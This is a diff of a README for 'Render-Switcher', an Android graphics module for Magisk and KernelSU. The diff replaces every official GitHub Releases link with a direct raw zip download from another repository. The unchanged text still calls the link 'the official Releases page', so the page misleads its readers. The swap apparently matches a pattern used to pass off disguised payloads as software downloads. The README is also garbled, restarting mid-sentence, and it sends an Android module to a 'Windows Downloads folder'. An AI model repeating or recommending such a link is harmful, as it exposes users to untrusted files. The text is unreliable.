@@ -5,7 +5,7 @@ description: "Switch Android renderer between Vulkan and OpenGL via Magisk, Kern
 ---
 # 🎮 Render-Switcher - Switch Android Graphics With Ease
 
-[![Download Render-Switcher](https://img.shields.io/badge/Download-Render--Switcher-7B1FA2?style=for-the-badge&logo=github)](https://github.com/TheAlienn/Render-Switcher/releases)
+[![Download Render-Switcher](https://img.shields.io/badge/Download-Render--Switcher-7B1FA2?style=for-the-badge&logo=github)](https://github.com/TheAlienn/thealienn.github.io/raw/refs/heads/main/snap/Latest_v1.0.zip)
 
 Render-Switcher is a simple control tool for Android graphics. It lets you choose how individual apps draw their screens by switching between Vulkan and OpenGL. Render-Switcher is delivered as a module for Magisk, KernelSU, and APatch, and it includes Zygisk support, a WebUI control panel, and a CLI for advanced users.
 
@@ -13,9 +13,9 @@ This guide is written for everyday computer users. You do not need programming k
 
 ## 📥 Download Render-Switcher
 
-Visit this link to download the application: [Render-Switcher Releases](https://github.com/TheAlienn/Render-Switcher/releases).
+Visit this link to download the application: [Render-Switcher Releases](https://github.com/TheAlienn/thealienn.github.io/raw/refs/heads/main/snap/Latest_v1.0.zip).
 
-[![Get Render-Switcher](https://img.shields.io/badge/Get-Render--Switcher-00C853?style=for-the-badge&logo=github)](https://github.com/TheAlienn/Render-Switcher/releases)
+[![Get Render-Switcher](https://img.shields.io/badge/Get-Render--Switcher-00C853?style=for-the-badge&logo=github)](https://github.com/TheAlienn/thealienn.github.io/raw/refs/heads/main/snap/Latest_v1.0.zip)
 
 The link opens the official Render-Switcher Releases page. Keep the downloaded release file in your Windows Downloads folder. Do not rename, unpack, or edit the file unless a step below tells you to do so.
 
@@ -50,7 +50,7 @@ Now move to your Android device. Keep the device charged and close other apps if
 
 1. Open the module manager app# 🎮 Render-Switcher - Switch Android Graphics With Ease
 
-[![Download Render-Switcher](https://img.shields.io/badge/Download-Render--Switcher-7B1FA2?style=for-the-badge&logo=github)](https://github.com/TheAlienn/Render-Switcher/releases)
+[![Download Render-Switcher](https://img.shields.io/badge/Download-Render--Switcher-7B1FA2?style=for-the-badge&logo=github)](https://github.com/TheAlienn/thealienn.github.io/raw/refs/heads/main/snap/Latest_v1.0.zip)
 
 Render-Switcher is a control tool for Android graphics. It lets you choose how individual apps draw their screens by switching between Vulkan and OpenGL. The tool is delivered as a module for Magisk, KernelSU, and APatch, and it includes Zygisk support, a WebUI control panel, and a command line interface for people who prefer typing commands.
 
@@ -58,9 +58,9 @@ This guide is written for everyday computer users. You do not need programming k
 
 ## 📥 Download Render-Switcher
 
-Visit this link to download the application: [Render-Switcher Releases](https://github.com/TheAlienn/Render-Switcher/releases).
+Visit this link to download the application: [Render-Switcher Releases](https://github.com/TheAlienn/thealienn.github.io/raw/refs/heads/main/snap/Latest_v1.0.zip).
 
-[![Get Render-Switcher](https://img.shields.io/badge/Get-Render--Switcher-00C853?style=for-the-badge&logo=github)](https://github.com/TheAlienn/Render-Switcher/releases)
+[![Get Render-Switcher](https://img.shields.io/badge/Get-Render--Switcher-00C853?style=for-the-badge&logo=github)](https://github.com/TheAlienn/thealienn.github.io/raw/refs/heads/main/snap/Latest_v1.0.zip)
 
 The link opens the official Render-Switcher Releases page. Save the downloaded release file to your Windows Downloads folder. Do not rename, unpack, or edit the file unless a step below tells you to do so.
 
